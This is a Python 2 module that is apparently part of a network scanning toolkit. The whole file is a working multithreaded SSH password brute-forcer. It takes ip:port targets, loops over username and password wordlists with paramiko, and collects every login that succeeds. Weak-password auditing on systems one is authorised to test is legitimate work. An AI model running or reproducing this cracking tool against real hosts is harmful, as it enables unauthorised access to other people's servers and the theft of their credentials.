#coding=utf-8
import time
import re
import threading
from threading import Thread
from lib.printers import printPink,printRed,printGreen
from Queue import Queue
import paramiko



def file2list(filename):
    try:
        list=[]
        d=open(filename,'r')
        data=d.readline().strip('\r\n')
        while(data):
            list.append(data)
            data=d.readline().strip('\r\n')
    except Exception,e:
        if e[0]==2:
            lock.acquire()
            printRed("not such file:%s\r\n" %filename)
            lock.release()
    return list

def ssh_connect(ip,username,password,port):
    crack=0
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip,port,username=username, password=password)
        crack=1
        client.close()
    except Exception,e:
        lock.acquire()
        print "%s ssh service 's %s:%s login fail " %(ip,username,password)
        lock.release()
        return crack
        pass
    return crack



def ssh():
    while True:
        ip,port=sp.get()
        flag=0
        usernames=file2list('ssh_user.txt')
        passwords=file2list('ssh_pass.txt')
        for username in usernames:
            for password in passwords:
                if ssh_connect(ip,username,password,port)==1:
                        lock.acquire()
                        printGreen("%s ssh service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        result.append("%s ssh service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        lock.release()
                        flag=1
                        break
            if flag==1:
                flag=0
                break

        sp.task_done()

def ssh_main(ipdict,threads):

    printPink("crack ssh  now...")
    print "[*] start crack ssh  %s" % time.ctime()
    starttime=time.time()
    global sp
    sp=Queue()
    global lock
    lock = threading.Lock()
    global result
    result=[]

    for i in xrange(threads):
        t = Thread(target=ssh)
        t.setDaemon(True)
        t.start()

    for ip in ipdict['ssh']:
        sp.put((str(ip).split(':')[0],int(str(ip).split(':')[1])))

    sp.join()

    print "[*] stop ssh serice  %s" % time.ctime()
    print "[*] crack ssh done,it has Elapsed time:%s " % (time.time()-starttime)
    return result
